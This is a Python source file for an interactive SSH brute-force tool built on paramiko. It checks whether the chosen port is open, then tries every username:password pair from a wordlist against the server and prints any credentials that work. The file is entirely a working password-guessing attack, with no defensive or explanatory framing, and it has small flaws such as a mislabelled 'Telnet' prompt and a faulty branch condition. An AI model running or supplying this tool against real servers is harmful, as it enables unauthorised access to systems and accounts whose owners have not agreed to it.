import paramiko
import socket

def ssh(host, port):
    print("1. Default Port (22)")
    print("2. Custom Port")
    choice = int(input("BruteForce >>"))
    if choice == 2:
        port = int(input("Enter the Custom Telnet Port : "))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, port))
            if connect != 0:
                print("[+] Port %s: Closed" %port)
                s.close()

            elif connect == 0:
                print("[+] Port %s: Open" %port)
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                if wordlist == '':
                    f = open("src/telnet.ini", "r")
                    f1 = f.readlines()
                else:
                    f = open(wordlist, "r")
                    f1 = f.readlines()
                for x in f1:
                    y = x.split(':')
                    username = y[0].strip(":")
                    password = y[1].strip("\n")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : %s" % (username, password))
                    try:
                        ssh.connect(host, port=port, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : %s") % password)
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")
        except socket.error as e:
            print("Error : %s" %e)

    elif choice == 1 | choice!= 2:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, 22))
            if connect != 0:
                print("[+] Port 22: Closed")
                s.close()

            elif connect == 0:
                print("[+] Port 22: Open")
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                if wordlist == '':
                    f = open("src/ssh.ini", "r")
                    f1 = f.readlines()
                else:
                    f = open(wordlist, "r")
                    f1 = f.readlines()
                for x in f1:
                    y = x.split(':')
                    username = y[0].strip(":")
                    password = y[1].strip("\n")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : %s" % (username, password))
                    try:
                        ssh.connect(host, port=22, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : %s") % password)
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")
        except socket.error as e:
            print("Error : %s" % e)
